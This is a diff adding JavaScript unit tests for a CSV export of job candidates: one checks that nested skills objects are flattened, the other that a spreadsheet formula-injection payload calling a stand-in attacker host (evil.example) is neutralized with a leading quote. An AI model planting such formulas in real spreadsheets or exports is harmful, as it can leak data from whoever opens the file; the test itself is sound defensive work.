@@ -60,6 +60,56 @@ test('buildCandidatesCsv protects joined array fields', () => {
   )
 })
 
+
+test('buildCandidatesCsv exports structured skills objects without object stringification', () => {
+  const csv = buildCandidatesCsv([
+    {
+      name: 'Structured Skills Candidate',
+      email: 'structured@example.com',
+      score: 77,
+      summary: 'Safe summary',
+      skills: {
+        tools_and_platforms: ['React'],
+        methodologies: ['Agile'],
+        domain_expertise: ['Healthcare'],
+        soft_skills: ['Communication'],
+        ignored_nested: { label: 'Do not stringify me' },
+      },
+      strengths: [],
+    },
+  ])
+
+  assert.equal(
+    getFirstCandidateRow(csv),
+    'Structured Skills Candidate,structured@example.com,77,Safe summary,React; Agile; Healthcare; Communication,',
+  )
+  assert.equal(csv.includes('[object Object]'), false)
+})
+
+test('buildCandidatesCsv neutralizes formulas after structured list flattening', () => {
+  const csv = buildCandidatesCsv([
+    {
+      name: 'Structured Formula Candidate',
+      email: 'formula@example.com',
+      score: 77,
+      summary: 'Safe summary',
+      skills: {
+        tools_and_platforms: ['=IMPORTXML("https://evil.example")', 'React'],
+        methodologies: [],
+        domain_expertise: [],
+        soft_skills: [],
+      },
+      strengths: [],
+    },
+  ])
+
+  assert.equal(
+    getFirstCandidateRow(csv),
+    `Structured Formula Candidate,formula@example.com,77,Safe summary,"'=IMPORTXML(""https://evil.example""); React",`,
+  )
+})
+
+
 test('buildCandidatesCsv keeps numeric score exported as a number while neutralizing string fields that start with dash', () => {
   const csv = buildCandidatesCsv([
     {
